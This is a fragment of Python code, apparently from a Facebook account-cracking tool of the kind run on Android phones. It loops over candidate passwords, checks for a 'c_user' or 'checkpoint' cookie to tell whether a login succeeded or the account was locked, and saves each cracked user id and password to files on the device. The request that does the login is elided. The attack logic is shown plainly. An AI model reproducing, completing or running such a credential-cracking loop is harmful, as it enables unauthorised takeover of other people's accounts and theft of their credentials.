    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m [𝐇𝐚𝐦𝐱-𝐎𝐊]  ' +cid+ ' | ' +ps+  ' \33[0;97m')
                open('/sdcard/𝐇𝐚𝐦𝐱𝐨-𝐎𝐊.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m [𝐇𝐚𝐦𝐱𝐨-𝐂𝐏]  ' +cid+ ' | ' +ps+   ' \33[0;97m')
                open('/sdcard/𝐇𝐚𝐦𝐱𝐨-𝐂𝐏.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
